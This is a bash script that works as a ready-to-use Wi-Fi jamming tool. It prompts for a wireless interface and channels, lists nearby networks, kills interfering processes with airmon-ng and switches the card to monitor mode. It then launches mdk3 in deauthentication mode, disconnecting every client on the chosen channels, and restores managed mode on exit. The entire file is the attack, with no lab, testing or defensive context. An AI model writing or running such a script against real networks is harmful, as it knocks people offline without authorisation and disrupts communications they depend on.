#!/bin/bash




clear
sleep 0.5;
	echo -e "\033[94m[-] Type the wireless interface you'd like to use and hit [ENTER]:\033[0m"
	echo ""
	echo "Network Interfaces:"
	sleep 0.5;
	ip -o link show | awk '/wlan/ {print $2,$9}'
	echo ""
	read -e WIFACE
	sleep 0.5; echo ""

	echo -e "\033[93m[-] Displaying networks in range...\033[0m"
	echo ""
	sleep 0.5;
	

nmcli -f "SSID,CHAN,SIGNAL,BARS" -c no d wifi
	
	echo ""
	sleep 0.5;	
	echo ""
	echo -e "\033[94m[-] Type the channel or channels you'd like to use (separated by commas) and hit [ENTER]:\033[0m"
	echo ""
	read -e CHANNEL
	sleep 0.5; echo


	echo -e "\033[93m[-] Finding interfering processes...\033[0m"
	sleep 1;

airmon-ng check kill
ifconfig $WIFACE down
iwconfig $WIFACE mode monitor
ifconfig $WIFACE up

function close {
	echo "
"
	echo -e "\033[31m[-] Exiting and returning card to managed mode!"
	ifconfig $WIFACE down
	iwconfig $WIFACE mode managed
	iwconfig $WIFACE | grep mode
	ifconfig $WIFACE up
	service network-manager restart
	echo ""
	sleep 1; echo
}

trap close SIGINT
	
	sleep 1;
	echo ""
	echo ""
	echo -e "\033[92m[-] Starting..."

mdk3 $WIFACE d -c $CHANNEL

